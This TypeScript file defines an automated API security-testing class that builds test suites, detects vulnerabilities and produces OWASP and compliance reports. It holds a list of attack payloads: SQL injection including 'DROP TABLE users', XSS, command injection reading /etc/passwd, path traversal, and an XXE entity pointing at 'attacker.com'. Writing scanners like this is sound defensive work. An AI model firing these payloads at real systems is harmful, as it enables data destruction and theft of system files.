import { ApiClient, HttpMethod, RequestOptions } from '../api/api-client';
import { APIResponse } from '@playwright/test';

export interface SecurityTestResult {
  testName: string;
  status: 'PASS' | 'FAIL' | 'SKIP';
  duration: number;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  vulnerability?: SecurityVulnerability;
  error?: string;
  details?: any;
}

export interface SecurityVulnerability {
  type: SecurityVulnerabilityType;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  description: string;
  endpoint: string;
  payload?: string;
  recommendation: string;
  cweId?: string;
  owaspCategory?: string;
}

export type SecurityVulnerabilityType = 
  | 'SQL_INJECTION'
  | 'XSS'
  | 'CSRF'
  | 'AUTH_BYPASS'
  | 'RATE_LIMIT_BYPASS'
  | 'DATA_EXPOSURE'
  | 'INFORMATION_DISCLOSURE'
  | 'INJECTION'
  | 'BROKEN_AUTHENTICATION'
  | 'SENSITIVE_DATA_EXPOSURE'
  | 'XML_EXTERNAL_ENTITY'
  | 'BROKEN_ACCESS_CONTROL'
  | 'SECURITY_MISCONFIGURATION'
  | 'CROSS_SITE_SCRIPTING'
  | 'INSECURE_DESERIALIZATION'
  | 'KNOWN_VULNERABILITIES'
  | 'INSUFFICIENT_LOGGING'
  | 'WEAK_CRYPTOGRAPHY';

export interface SecurityTestSuite {
  name: string;
  description: string;
  tests: SecurityTestCase[];
  complianceFramework?: 'OWASP' | 'PCI_DSS' | 'SOX' | 'GDPR' | 'HIPAA';
}

export interface SecurityTestCase {
  name: string;
  description: string;
  method: HttpMethod;
  path: string;
  options?: RequestOptions;
  expectedStatus?: number | number[];
  vulnerabilityType: SecurityVulnerabilityType;
  payload?: any;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  complianceCheck?: boolean;
}

export interface SecurityAnalysis {
  vulnerabilities: SecurityVulnerability[];
  riskScore: number;
  complianceStatus: ComplianceStatus;
  recommendations: SecurityRecommendation[];
  attackSurface: AttackSurface;
}

export interface ComplianceStatus {
  owasp: ComplianceCheck[];
  pciDss: ComplianceCheck[];
  sox: ComplianceCheck[];
  gdpr: ComplianceCheck[];
}

export interface ComplianceCheck {
  requirement: string;
  status: 'PASS' | 'FAIL' | 'WARNING';
  description: string;
  recommendation?: string;
}

export interface SecurityRecommendation {
  priority: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  category: string;
  description: string;
  implementation: string;
  estimatedEffort: 'LOW' | 'MEDIUM' | 'HIGH';
}

export interface AttackSurface {
  endpoints: EndpointSecurity[];
  exposedData: string[];
  authenticationMethods: string[];
  authorizationLevels: string[];
}

export interface EndpointSecurity {
  path: string;
  methods: HttpMethod[];
  authenticationRequired: boolean;
  authorizationLevel: string;
  vulnerabilities: SecurityVulnerabilityType[];
  riskLevel: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
}

export class SecurityTestingAgent {
  private apiClient: ApiClient;
  private testResults: SecurityTestResult[] = [];
  private analysis: SecurityAnalysis = {
    vulnerabilities: [],
    riskScore: 0,
    complianceStatus: {
      owasp: [],
      pciDss: [],
      sox: [],
      gdpr: []
    },
    recommendations: [],
    attackSurface: {
      endpoints: [],
      exposedData: [],
      authenticationMethods: [],
      authorizationLevels: []
    }
  };

  // Common attack payloads
  private readonly attackPayloads = {
    sqlInjection: [
      "1'; DROP TABLE users; --",
      "1' OR '1'='1",
      "1' UNION SELECT * FROM users --",
      "1'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
    ],
    xss: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<svg onload=alert('XSS')>",
      "<iframe src=javascript:alert('XSS')></iframe>"
    ],
    commandInjection: [
      "; ls -la",
      "| cat /etc/passwd",
      "&& whoami",
      "`id`",
      "$(cat /etc/passwd)"
    ],
    pathTraversal: [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    ],
    xmlExternalEntity: [
      "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
      "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://attacker.com/steal'>]><root>&xxe;</root>"
    ]
  };

  constructor(apiClient: ApiClient) {
    this.apiClient = apiClient;
  }

  /**
   * Generate comprehensive security test suite
   */
  generateSecurityTestSuite(endpoint: string, methods: HttpMethod[] = ['GET']): SecurityTestSuite {
    const tests: SecurityTestCase[] = [];

    for (const method of methods) {
      // SQL Injection tests
      if (method === 'GET') {
        tests.push({
          name: `SQL Injection - Path Parameter`,
          description: `Test SQL injection in path parameter for ${endpoint}`,
          method,
          path: `${endpoint}/1'; DROP TABLE users; --`,
          expectedStatus: [400, 404, 403, 500],
          vulnerabilityType: 'SQL_INJECTION',
          payload: "1'; DROP TABLE users; --",
          severity: 'HIGH',
          complianceCheck: true
        });
      }

      // XSS tests
      if (method === 'POST' || method === 'PUT') {
        tests.push({
          name: `XSS - Request Body`,
          description: `Test XSS in request body for ${endpoint}`,
          method,
          path: endpoint,
          options: {
            data: {
              name: '<script>alert("XSS")</script>',
              description: '<img src=x onerror=alert("XSS")>'
            },
            headers: { 'Content-Type': 'application/json' }
          },
          expectedStatus: [400, 422],
          vulnerabilityType: 'XSS',
          payload: '<script>alert("XSS")</script>',
          severity: 'MEDIUM',
          complianceCheck: true
        });
      }

      // Authentication bypass tests
      tests.push({
        name: `Authentication Bypass - No Token`,
        description: `Test authentication bypass for ${endpoint}`,
        method,
        path: endpoint,
        expectedStatus: [401, 403],
        vulnerabilityType: 'AUTH_BYPASS',
        severity: 'HIGH',
        complianceCheck: true
      });

      // Rate limiting tests
      tests.push({
        name: `Rate Limiting - Rapid Requests`,
        description: `Test rate limiting for ${endpoint}`,
        method,
        path: endpoint,
        expectedStatus: [200, 429],
        vulnerabilityType: 'RATE_LIMIT_BYPASS',
        severity: 'MEDIUM',
        complianceCheck: true
      });
    }

    return {
      name: `Security Test Suite - ${endpoint}`,
      description: `Comprehensive security testing for ${endpoint} endpoint`,
      tests,
      complianceFramework: 'OWASP'
    };
  }

  /**
   * Execute security test case
   */
  async executeSecurityTest(testCase: SecurityTestCase): Promise<SecurityTestResult> {
    const startTime = Date.now();
    
    try {
      console.log(`🔒 Running security test: ${testCase.name}`);
      
      const response = await this.apiClient.requestMethod(
        testCase.method,
        testCase.path,
        testCase.options || {}
      );
      
      const duration = Date.now() - startTime;
      const result: SecurityTestResult = {
        testName: testCase.name,
        status: 'PASS',
        duration,
        severity: testCase.severity,
        details: {
          statusCode: response.status(),
          responseTime: duration,
          headers: response.headers()
        }
      };

      // Perform security-specific checks
      const vulnerability = await this.detectVulnerability(testCase, response);
      if (vulnerability) {
        result.status = 'FAIL';
        result.vulnerability = vulnerability;
        this.analysis.vulnerabilities.push(vulnerability);
      }

      // Status code validation
      if (testCase.expectedStatus) {
        const expectedStatuses = Array.isArray(testCase.expectedStatus) 
          ? testCase.expectedStatus 
          : [testCase.expectedStatus];
        
        if (!expectedStatuses.includes(response.status())) {
          if (result.status === 'PASS') {
            result.status = 'FAIL';
            result.error = `Expected status ${expectedStatuses.join(' or ')}, got ${response.status()}`;
          }
        }
      }

      console.log(`🔒 Security test ${testCase.name}: ${result.status} (${duration}ms)`);
      return result;

    } catch (error) {
      const duration = Date.now() - startTime;
      console.log(`❌ Security test ${testCase.name}: FAIL (${duration}ms)`);
      
      return {
        testName: testCase.name,
        status: 'FAIL',
        duration,
        severity: testCase.severity,
        error: error instanceof Error ? error.message : String(error)
      };
    }
  }

  /**
   * Execute complete security test suite
   */
  async executeSecurityTestSuite(testSuite: SecurityTestSuite): Promise<SecurityTestResult[]> {
    console.log(`🛡️ Starting security test suite: ${testSuite.name}`);
    console.log(`📋 Description: ${testSuite.description}`);
    console.log(`🔢 Total tests: ${testSuite.tests.length}`);
    
    const results: SecurityTestResult[] = [];
    
    for (const testCase of testSuite.tests) {
      const result = await this.executeSecurityTest(testCase);
      results.push(result);
      this.testResults.push(result);
    }
    
    this.calculateRiskScore();
    this.generateComplianceChecks(testSuite.complianceFramework);
    this.generateRecommendations();
    
    this.printSecuritySummary(results);
    return results;
  }

  /**
   * Detect specific vulnerabilities
   */
  private async detectVulnerability(testCase: SecurityTestCase, response: APIResponse): Promise<SecurityVulnerability | null> {
    const status = response.status();
    
    switch (testCase.vulnerabilityType) {
      case 'SQL_INJECTION':
        return this.detectSqlInjection(testCase, response);
      
      case 'XSS':
        return this.detectXss(testCase, response);
      
      case 'AUTH_BYPASS':
        return this.detectAuthBypass(testCase, response);
      
      case 'RATE_LIMIT_BYPASS':
        return this.detectRateLimitBypass(testCase, response);
      
      case 'DATA_EXPOSURE':
        return this.detectDataExposure(testCase, response);
      
      case 'INFORMATION_DISCLOSURE':
        return this.detectInformationDisclosure(testCase, response);
      
      default:
        return null;
    }
  }

  /**
   * Detect SQL Injection vulnerabilities
   */
  private async detectSqlInjection(testCase: SecurityTestCase, response: APIResponse): Promise<SecurityVulnerability | null> {
    const status = response.status();
    
    // If SQL injection payload returns 200, it's a vulnerability
    if (status === 200) {
      return {
        type: 'SQL_INJECTION',
        severity: 'HIGH',
        description: 'API accepts SQL injection in path parameter',
        endpoint: testCase.path,
        payload: testCase.payload,
        recommendation: 'Implement input validation and parameterized queries',
        cweId: 'CWE-89',
        owaspCategory: 'A03:2021 – Injection'
      };
    }
    
    // Check response body for SQL error messages
    if (status >= 400) {
      try {
        const body = await response.text();
        const sqlErrorPatterns = [
          /sql syntax/i,
          /mysql/i,
          /postgresql/i,
          /oracle/i,
          /sqlite/i,
          /microsoft.*sql/i,
          /syntax error/i,
          /table.*doesn't exist/i,
          /column.*doesn't exist/i
        ];
        
        if (sqlErrorPatterns.some(pattern => pattern.test(body))) {
          return {
            type: 'INFORMATION_DISCLOSURE',
            severity: 'MEDIUM',
            description: 'SQL error message exposed in response',
            endpoint: testCase.path,
            payload: testCase.payload,
            recommendation: 'Implement generic error messages',
            cweId: 'CWE-209',
            owaspCategory: 'A09:2021 – Security Logging and Monitoring Failures'
          };
        }
      } catch (e) {
        // Ignore parsing errors
      }
    }
    
    return null;
  }

  /**
   * Detect XSS vulnerabilities
   */
  private async detectXss(testCase: SecurityTestCase, response: APIResponse): Promise<SecurityVulnerability | null> {
    const status = response.status();
    
    // If XSS payload is accepted and returned, it's a vulnerability
    if (status === 200 || status === 201) {
      try {
        const body = await response.text();
        if (body.includes('<script>') || body.includes('javascript:')) {
          return {
            type: 'XSS',
            severity: 'MEDIUM',
            description: 'API accepts XSS payload without sanitization',
            endpoint: testCase.path,
            payload: testCase.payload,
            recommendation: 'Implement input sanitization and output encoding',
            cweId: 'CWE-79',
            owaspCategory: 'A03:2021 – Injection'
          };
        }
      } catch (e) {
        // Ignore parsing errors
      }
    }
    
    return null;
  }

  /**
   * Detect authentication bypass vulnerabilities
   */
  private async detectAuthBypass(testCase: SecurityTestCase, response: APIResponse): Promise<SecurityVulnerability | null> {
    const status = response.status();
    
    // If endpoint is accessible without authentication, it's a vulnerability
    if (status === 200) {
      return {
        type: 'AUTH_BYPASS',
        severity: 'HIGH',
        description: 'Endpoint accessible without authentication',
        endpoint: testCase.path,
        recommendation: 'Implement proper authentication checks',
        cweId: 'CWE-287',
        owaspCategory: 'A07:2021 – Identification and Authentication Failures'
      };
    }
    
    return null;
  }

  /**
   * Detect rate limiting bypass vulnerabilities
   */
  private async detectRateLimitBypass(testCase: SecurityTestCase, response: APIResponse): Promise<SecurityVulnerability | null> {
    const status = response.status();
    
    // If rapid requests don't get rate limited, it's a vulnerability
    if (status === 200) {
      return {
        type: 'RATE_LIMIT_BYPASS',
        severity: 'MEDIUM',
        description: 'No rate limiting detected on endpoint',
        endpoint: testCase.path,
        recommendation: 'Implement rate limiting and abuse prevention',
        cweId: 'CWE-770',
        owaspCategory: 'A04:2021 – Insecure Design'
      };
    }
    
    return null;
  }

  /**
   * Detect data exposure vulnerabilities
   */
  private async detectDataExposure(testCase: SecurityTestCase, response: APIResponse): Promise<SecurityVulnerability | null> {
    if (response.ok()) {
      try {
        const body = await response.text();
        const sensitiveDataPatterns = [
          /password/i,
          /secret/i,
          /token/i,
          /key/i,
          /ssn/i,
          /credit.*card/i,
          /social.*security/i
        ];
        
        if (sensitiveDataPatterns.some(pattern => pattern.test(body))) {
          return {
            type: 'DATA_EXPOSURE',
            severity: 'HIGH',
            description: 'Sensitive data exposed in response',
            endpoint: testCase.path,
            recommendation: 'Implement data masking and access controls',
            cweId: 'CWE-200',
            owaspCategory: 'A02:2021 – Cryptographic Failures'
          };
        }
      } catch (e) {
        // Ignore parsing errors
      }
    }
    
    return null;
  }

  /**
   * Detect information disclosure vulnerabilities
   */
  private async detectInformationDisclosure(testCase: SecurityTestCase, response: APIResponse): Promise<SecurityVulnerability | null> {
    if (response.status() >= 400) {
      try {
        const body = await response.text();
        const infoDisclosurePatterns = [
          /stack trace/i,
          /error.*at.*line/i,
          /file.*path/i,
          /database.*error/i,
          /sql.*error/i,
          /internal.*error/i
        ];
        
        if (infoDisclosurePatterns.some(pattern => pattern.test(body))) {
          return {
            type: 'INFORMATION_DISCLOSURE',
            severity: 'MEDIUM',
            description: 'Internal information exposed in error response',
            endpoint: testCase.path,
            recommendation: 'Implement generic error messages',
            cweId: 'CWE-209',
            owaspCategory: 'A09:2021 – Security Logging and Monitoring Failures'
          };
        }
      } catch (e) {
        // Ignore parsing errors
      }
    }
    
    return null;
  }

  /**
   * Calculate overall risk score
   */
  private calculateRiskScore(): void {
    let score = 0;
    
    for (const vulnerability of this.analysis.vulnerabilities) {
      switch (vulnerability.severity) {
        case 'CRITICAL':
          score += 10;
          break;
        case 'HIGH':
          score += 7;
          break;
        case 'MEDIUM':
          score += 4;
          break;
        case 'LOW':
          score += 1;
          break;
      }
    }
    
    this.analysis.riskScore = Math.min(score, 100);
  }

  /**
   * Generate compliance checks
   */
  private generateComplianceChecks(framework?: string): void {
    if (framework === 'OWASP' || !framework) {
      this.generateOwaspChecks();
    }
    
    if (framework === 'PCI_DSS') {
      this.generatePciDssChecks();
    }
    
    if (framework === 'SOX') {
      this.generateSoxChecks();
    }
  }

  /**
   * Generate OWASP Top 10 compliance checks
   */
  private generateOwaspChecks(): void {
    const owaspChecks: ComplianceCheck[] = [
      {
        requirement: 'A01:2021 – Broken Access Control',
        status: this.analysis.vulnerabilities.some(v => v.type === 'AUTH_BYPASS') ? 'FAIL' : 'PASS',
        description: 'Check for broken access control vulnerabilities',
        recommendation: 'Implement proper authorization checks'
      },
      {
        requirement: 'A02:2021 – Cryptographic Failures',
        status: this.analysis.vulnerabilities.some(v => v.type === 'DATA_EXPOSURE') ? 'FAIL' : 'PASS',
        description: 'Check for sensitive data exposure',
        recommendation: 'Implement proper encryption and data protection'
      },
      {
        requirement: 'A03:2021 – Injection',
        status: this.analysis.vulnerabilities.some(v => v.type === 'SQL_INJECTION' || v.type === 'XSS') ? 'FAIL' : 'PASS',
        description: 'Check for injection vulnerabilities',
        recommendation: 'Implement input validation and output encoding'
      }
    ];
    
    this.analysis.complianceStatus.owasp = owaspChecks;
  }

  /**
   * Generate PCI DSS compliance checks
   */
  private generatePciDssChecks(): void {
    const pciChecks: ComplianceCheck[] = [
      {
        requirement: 'PCI DSS 3.4 - Mask PAN when displayed',
        status: this.analysis.vulnerabilities.some(v => v.type === 'DATA_EXPOSURE') ? 'FAIL' : 'PASS',
        description: 'Check for credit card data exposure',
        recommendation: 'Implement PAN masking and tokenization'
      },
      {
        requirement: 'PCI DSS 6.5 - Develop secure applications',
        status: this.analysis.vulnerabilities.some(v => v.severity === 'HIGH' || v.severity === 'CRITICAL') ? 'FAIL' : 'PASS',
        description: 'Check for high-severity vulnerabilities',
        recommendation: 'Implement secure coding practices'
      }
    ];
    
    this.analysis.complianceStatus.pciDss = pciChecks;
  }

  /**
   * Generate SOX compliance checks
   */
  private generateSoxChecks(): void {
    const soxChecks: ComplianceCheck[] = [
      {
        requirement: 'SOX 404 - Internal Controls',
        status: this.analysis.vulnerabilities.some(v => v.type === 'INSUFFICIENT_LOGGING') ? 'FAIL' : 'PASS',
        description: 'Check for audit trail and logging',
        recommendation: 'Implement comprehensive audit logging'
      },
      {
        requirement: 'SOX 302 - Financial Data Integrity',
        status: this.analysis.vulnerabilities.some(v => v.type === 'DATA_EXPOSURE') ? 'FAIL' : 'PASS',
        description: 'Check for financial data protection',
        recommendation: 'Implement data integrity controls'
      }
    ];
    
    this.analysis.complianceStatus.sox = soxChecks;
  }

  /**
   * Generate security recommendations
   */
  private generateRecommendations(): void {
    const recommendations: SecurityRecommendation[] = [];
    
    // High priority recommendations for critical vulnerabilities
    if (this.analysis.vulnerabilities.some(v => v.severity === 'CRITICAL')) {
      recommendations.push({
        priority: 'CRITICAL',
        category: 'Vulnerability Remediation',
        description: 'Address critical security vulnerabilities immediately',
        implementation: 'Review and fix all critical vulnerabilities before production deployment',
        estimatedEffort: 'HIGH'
      });
    }
    
    // Input validation recommendations
    if (this.analysis.vulnerabilities.some(v => v.type === 'SQL_INJECTION' || v.type === 'XSS')) {
      recommendations.push({
        priority: 'HIGH',
        category: 'Input Validation',
        description: 'Implement comprehensive input validation',
        implementation: 'Add input sanitization, validation, and output encoding',
        estimatedEffort: 'MEDIUM'
      });
    }
    
    // Authentication recommendations
    if (this.analysis.vulnerabilities.some(v => v.type === 'AUTH_BYPASS')) {
      recommendations.push({
        priority: 'HIGH',
        category: 'Authentication',
        description: 'Strengthen authentication mechanisms',
        implementation: 'Implement proper authentication checks and session management',
        estimatedEffort: 'MEDIUM'
      });
    }
    
    this.analysis.recommendations = recommendations;
  }

  /**
   * Generate comprehensive security report
   */
  generateSecurityReport(): string {
    const totalTests = this.testResults.length;
    const passedTests = this.testResults.filter(r => r.status === 'PASS').length;
    const failedTests = this.testResults.filter(r => r.status === 'FAIL').length;
    const criticalVulns = this.analysis.vulnerabilities.filter(v => v.severity === 'CRITICAL').length;
    const highVulns = this.analysis.vulnerabilities.filter(v => v.severity === 'HIGH').length;
    
    let report = `
# Security Test Report

## Executive Summary
- **Total Tests**: ${totalTests}
- **Passed**: ${passedTests} (${((passedTests/totalTests)*100).toFixed(1)}%)
- **Failed**: ${failedTests} (${((failedTests/totalTests)*100).toFixed(1)}%)
- **Risk Score**: ${this.analysis.riskScore}/100
- **Critical Vulnerabilities**: ${criticalVulns}
- **High Vulnerabilities**: ${highVulns}

## Vulnerability Summary
`;

    // Group vulnerabilities by type
    const vulnByType = this.analysis.vulnerabilities.reduce((acc, vuln) => {
      acc[vuln.type] = (acc[vuln.type] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);

    for (const [type, count] of Object.entries(vulnByType)) {
      report += `- **${type}**: ${count} vulnerabilities\n`;
    }

    report += `\n## Detailed Vulnerabilities\n`;
    for (const vuln of this.analysis.vulnerabilities) {
      report += `\n### ${vuln.type} (${vuln.severity})\n`;
      report += `- **Endpoint**: ${vuln.endpoint}\n`;
      report += `- **Description**: ${vuln.description}\n`;
      report += `- **Recommendation**: ${vuln.recommendation}\n`;
      if (vuln.cweId) report += `- **CWE ID**: ${vuln.cweId}\n`;
      if (vuln.owaspCategory) report += `- **OWASP Category**: ${vuln.owaspCategory}\n`;
    }

    // Compliance status
    if (this.analysis.complianceStatus.owasp.length > 0) {
      report += `\n## OWASP Compliance Status\n`;
      for (const check of this.analysis.complianceStatus.owasp) {
        const status = check.status === 'PASS' ? '✅' : '❌';
        report += `\n${status} **${check.requirement}**: ${check.description}\n`;
        if (check.recommendation) {
          report += `   Recommendation: ${check.recommendation}\n`;
        }
      }
    }

    // Recommendations
    if (this.analysis.recommendations.length > 0) {
      report += `\n## Security Recommendations\n`;
      for (const rec of this.analysis.recommendations) {
        report += `\n### ${rec.priority} Priority: ${rec.category}\n`;
        report += `- **Description**: ${rec.description}\n`;
        report += `- **Implementation**: ${rec.implementation}\n`;
        report += `- **Estimated Effort**: ${rec.estimatedEffort}\n`;
      }
    }

    return report;
  }

  /**
   * Print security test summary
   */
  private printSecuritySummary(results: SecurityTestResult[]): void {
    const passed = results.filter(r => r.status === 'PASS').length;
    const failed = results.filter(r => r.status === 'FAIL').length;
    const critical = this.analysis.vulnerabilities.filter(v => v.severity === 'CRITICAL').length;
    const high = this.analysis.vulnerabilities.filter(v => v.severity === 'HIGH').length;
    
    console.log(`\n🛡️ Security Test Summary:`);
    console.log(`✅ Passed: ${passed}`);
    console.log(`❌ Failed: ${failed}`);
    console.log(`🚨 Critical Vulnerabilities: ${critical}`);
    console.log(`⚠️ High Vulnerabilities: ${high}`);
    console.log(`📊 Risk Score: ${this.analysis.riskScore}/100\n`);
  }

  /**
   * Get all security test results
   */
  getSecurityTestResults(): SecurityTestResult[] {
    return this.testResults;
  }

  /**
   * Get security analysis
   */
  getSecurityAnalysis(): SecurityAnalysis {
    return this.analysis;
  }

  /**
   * Clear all test results and analysis
   */
  clearResults(): void {
    this.testResults = [];
    this.analysis = {
      vulnerabilities: [],
      riskScore: 0,
      complianceStatus: {
        owasp: [],
        pciDss: [],
        sox: [],
        gdpr: []
      },
      recommendations: [],
      attackSurface: {
        endpoints: [],
        exposedData: [],
        authenticationMethods: [],
        authorizationLevels: []
      }
    };
  }
}

export default SecurityTestingAgent;
